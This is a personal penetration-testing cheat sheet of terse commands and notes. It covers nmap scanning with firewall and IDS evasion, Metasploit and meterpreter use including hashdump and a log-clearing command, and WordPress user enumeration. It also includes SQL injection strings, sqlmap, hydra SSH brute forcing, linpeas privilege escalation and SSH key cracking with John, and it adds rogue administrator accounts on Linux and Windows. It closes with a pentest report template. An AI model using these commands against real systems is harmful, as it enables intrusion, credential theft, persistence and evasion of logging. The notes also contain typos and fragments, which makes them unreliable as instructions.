Pen testing

https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
https://www.blackmoreops.com/2016/12/20/kali-linux-cheat-sheet-for-penetration-testers/
https://0xsp.com/offensive/red-ops-techniques/hunting-windows-credentials-creduipromptforwindowscredentials
https://redtm.com/docs/pentest/pentest-cheat-sheet/#port-3389rdp
https://www.sans.org/blog/sans-pen-test-cheat-sheet-scapy/


linpeas for privilage escalation

vbox
----install guest additions

linux
> sudo su 
> apt update && apt full-upgrade
> tee  to send output to file 

go to /tmp as low level user

*************RECON
=============NMAP
nmap <ip address> -n --top-ports 1000 -T5 

-Pn skips host discovery

simple 
nmap 11.1.1.1
if host seems down use -Pn turns of host discovery
-sV for the version of the server
-sC default scripts and specify port  -p 111
-n at the end so we dont get dns resolution

network discovery  not stealthly
nmap -sP 111.111.111./24

stealth and os details
nmap -sS -A 111.111.111
nmap 111.111.111 -n -p 22,23,443 -sV -A 
%%%%syn Scan
default in nmap ...is fast...send reset packs so is stealth 

%%%%%%TCP Scan
second option...takes longer

%%%% -p 1-65535   all ports likely to be detected by intrusion detection
--top-ports 1000 or any number

%%%% saving to file
-oA <file name>
add the three file to new dir

/usr/share/nmap/scripts | grep 

nmap -Pn --script=rdp......  <ip>


firewall and ids evasion

nmap -sT -P0 <ip>  or nmap -sS <ip>

for breaking the packets into pieces
nmap -f <ip>

nmap -sS -f --proxies <proxyip> <ip> 

-T0 -T1...5   this is the speed of the 

you can change the length of the packet as FW or IDS know the length  what is it?
nmap -sS -A -T2 --data-length 1400 <ip>
===================finding Exploits in terminal
> searchsploit <server name>


=============Metasploit
> msfconsole  >press enter
> search edb:xxxxxx
> search vsftpd
when you find an exploit 
>use exploit/xxxx/xxxx/xxxx
> show options
>info
> set rhost <hack machine>
> setg to set globally
> run or exploit
shell -i  for an interactive shell
> check   will give the probability  of success
============meterpreter+++++++++++++++windows   
>msfconsole

>hosts
> background
>services 
> sysinfo
> hashdump  get screenshot and use john the ripper
>clearevM   this will clear up logs
>db_nmap <ip> -A -T5 
>db_nmap <ip> -p xxxx,xxxx  -sV -T5 -n -Pn

=============Wireshark
sniffing spoofing in kali
eth1 for internal

for file download as export packet bytes

===========WordPress
Scan server
wpscan --url http://111.111.111 > filename

Get all the users
wpscan --url http://111.111.111   --enumerate u

==========sqlmap======
attacks;
name = Smith' or '1'='1   ( 'or 1=1 --  )
number = 1234 or 1=1

sqlmap -u "url" --data="copied from zap/burp" -p uid

blind sql use burp

============netcat==============
nc <ip> <port>

===============nikto===========
nikto -host <ip> -p xxx


=======gobuster==========
gobuster -w /opt/Dirbuster-0.12/directory-list-2.3.medium.txt -u <ip>


==============smb
sudo enum4linux -U <ip>
-S for shares
-A for everything

sudo smbclient -L <ip>/profiles


=============hydra=====
hyrda -l <username> -P /opt/rockyou.txt ssh://<ip>

=========linpeas========================
clone repo in /option
scp location name@<ip>:/dev/shm
mark it as exc chmod +x file name
./file   | tee


====private files
copy idrsa in a file
chmod 600 file
ssh -i rsafile name@<ip>

=========john ripper=========
convert rsa file
/opt/JohnTheRipper/run/ssh2john.py  idrsa file > forjohn.txt

/opt/JohnTheRipper/run/john filename  --wordlist=/opt/rockyou.txt

==============kerbros roasting?

sql injection1`

CSRF

BruteForce passwords
wget "https://www.dropbox.com/s/ccd03rcch4t1bs4/passwords.zip"
unzip passwords.zip



Process
ping <ip>


===========Creating users==========

%%%%%linux
useradd -u 12345 -g root -d /home/pentest2 -s /bin/bash -p $(echo pentestest2  | openssl passwd -l -stdin) pentest2
verify
>ssh pentest2@<ipaddress>

%%%%%windows
>net user pentester pentester123 /ADD
>net localgroup administrators pentester /ADD
> pwd where am i
> ps for services
> getuid
>  screenshot
&&&&&&&&&&Priv esc&&&&&&&&
> unix-privesc-check    
    
ports

445 smb
3389 rdp



&&&&&&&&&&&&&&REPORT&&&&&&&&&&&&&&&&&
Pre engagement
*Contact details
*Brief History - had a pentest before
*Types of Pentesting 
    Web app
    Internal Infrastructure
    DB assessment
    Build Review
    API Pentesting
    Mobile App Security
*Project Timeframe
*Goal/Aim of test
Is there a WAF
WebApp Scan
Static pages vs dynamic pages
Types of roles/users
Are all ip addresses owned by the company

Post engagement
Exe summary
Tech summary
Findings
Record times it was run
*Issue Title & Risk rating
*Description
*Affected Components
*Reccommendation
*References appro
    Tools used and versions 
    Payloads
